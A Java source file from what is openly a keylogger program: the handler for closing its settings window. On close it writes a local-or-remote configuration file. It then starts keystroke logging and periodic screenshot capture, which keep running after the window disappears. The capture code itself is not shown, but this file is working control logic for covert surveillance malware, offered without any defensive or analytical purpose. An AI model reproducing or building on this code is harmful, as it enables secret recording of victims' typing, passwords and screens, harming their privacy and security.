package gui;

import io.File;

import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;

import keylog.KeyLogger;
import static debug.DebugSettings.debug;

class WindowEventHandler extends WindowAdapter {
	
	private static int ScreenCapture=4;
	private static boolean KeyboardCapture;
	private static int Mode;
	
	private static int ScreenInt=60;
	  
	public void windowClosing(WindowEvent evt) {
	    KeyLogger kl = new KeyLogger();
		
	    if ( (ScreenCapture == KeyLogger.SCREEN_MODE_OFF) && (KeyboardCapture == false)   ){
			debug("no changes were made");

	    		debug(ScreenCapture+" saved");
	    		File f = new File("conf");
	    		if (Mode == KeyLogger.MODE_REMOTE)
	    			f.ReWrite("Remote"+"#"+ScreenInt+"#"+ScreenCapture+"#"+KeyboardCapture);
	    		else
	    			f.ReWrite("Local"+"#"+ScreenInt+"#"+ScreenCapture+"#"+KeyboardCapture);			

	    	System.exit(0);
	    }//if the user wan't to record no activity at all,save the changes and exit
	    else{
		    
	    	kl.StartListening();
	    	
		    kl.SetMode(Mode);	//configures the timers for screenshots, local or remote

		    //------------------------------------
	    	File f = new File("conf");
		    if (Mode == KeyLogger.MODE_REMOTE)
		    	f.ReWrite("Remote"+"#"+ScreenInt+"#"+ScreenCapture+"#"+KeyboardCapture);
		    else
		    	f.ReWrite("Local"+"#"+ScreenInt+"#"+ScreenCapture+"#"+KeyboardCapture);
			//-----------------------------------
		    debug(KeyboardCapture);
		    
		    if (KeyboardCapture)
				kl.StartSession();
			
			if (ScreenCapture == KeyLogger.SCREEN_MODE_ON){
				kl.SetScreenshotMode(KeyLogger.SCREEN_MODE_ON);//configures the screenshots
				kl.SetScreenshotInterval(ScreenInt);
				kl.StartScreenCapturing();
			}//start taking screenshots
			else
				kl.SetScreenshotMode(KeyLogger.SCREEN_MODE_OFF);
			
			debug("Exiting program");
	    }//else
	
	}//------------------------------------------------
	
	public static void SetScreenMode(int b){
		ScreenCapture = b;
		debug("Screen mode set to "+ScreenCapture);
	}
	public static void SetKeyboardCapture(boolean b){KeyboardCapture = b;}
	public static void SetMode(int b){Mode = b;}//remote or local
	public static void SetScreenshotInterval(int i){ScreenInt = i;}
	  
}//WindowAdapter
